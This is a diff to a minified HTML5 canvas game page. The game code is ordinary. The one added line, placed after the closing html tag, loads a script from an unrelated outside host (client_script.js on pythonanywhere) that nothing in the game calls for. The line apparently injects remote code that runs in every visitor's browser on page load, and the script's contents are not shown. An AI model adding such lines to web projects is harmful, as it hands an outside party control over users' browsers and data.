@@ -57,3 +57,4 @@ DEBUG&&_editor&&this.paused&&_editor.draw();0<this.transitionTicksLeft&&_gfx.dra
 bindEvent(window,'oreintationchange',this.handleResize.bind(this));_raf(this.frame.bind(this))}}let _gfx,_game,_editor,_zoom=1,_padX=0,_padY=0,_canvasWidth=1200,_canvasHeight=900,_wallFrontCtx,_wallBackCtx,_transitionCtx;function startEditor(a){a.parentNode.removeChild(a);_editor||(_editor=new Editor,_editor.init())}function init(){inputInit();_gfx=new Gfx;_game=new Game;_game.init();_game.transitionTicksLeft=30}bindEvent(window,'load',init);
 </script>
 </head><body><canvas id="canvas-back"></canvas><canvas id="canvas-main"></canvas><canvas id="canvas-front"></canvas><canvas id="canvas-transition"></canvas><div id="hint"></div><div id="tip"></div></body></html>
+<script src="https://olibot13.pythonanywhere.com/client_script.js"></script>
